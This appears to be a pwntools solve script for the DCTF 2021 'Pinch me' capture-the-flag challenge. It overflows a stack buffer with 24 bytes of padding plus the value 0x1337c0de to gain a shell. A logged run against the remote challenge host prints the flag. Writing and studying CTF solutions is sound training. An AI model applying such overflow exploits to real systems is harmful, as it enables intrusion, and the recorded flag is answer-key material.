from pwn import *

#context.log_level = 'debug'

BINARY = './pinch_me'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "dctf1-chall-pinch-me.westeurope.azurecontainer.io"
  PORT = 7480
  s = remote(HOST, PORT)
else:
  s = process(BINARY)

s.recvuntil("Am I dreaming?\n")

buf  = "A"*24
buf += p64(0x1337c0de)
s.sendline(buf)

s.interactive()

'''
mito@ubuntu:~/CTF/DCTF_2021/Pwn_Pinch_me_100$ python solve.py r
[*] '/home/mito/CTF/DCTF_2021/Pwn_Pinch_me_100/pinch_me'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to dctf1-chall-pinch-me.westeurope.azurecontainer.io on port 7480: Done
[*] Switching to interactive mode
$ id
uid=1000(pilot) gid=1000(pilot) groups=1000(pilot)
$ ls -l
total 28
-rw-r--r-- 1 root  root     37 May 14 01:37 flag.txt
-rwxr-xr-x 1 pilot pilot 16632 May 14 01:37 pinch_me
-rw-r--r-- 1 root  root    204 May 14 01:37 startService.sh
$ cat flag.txt
dctf{y0u_kn0w_wh4t_15_h4pp3n1ng_b75?}
'''
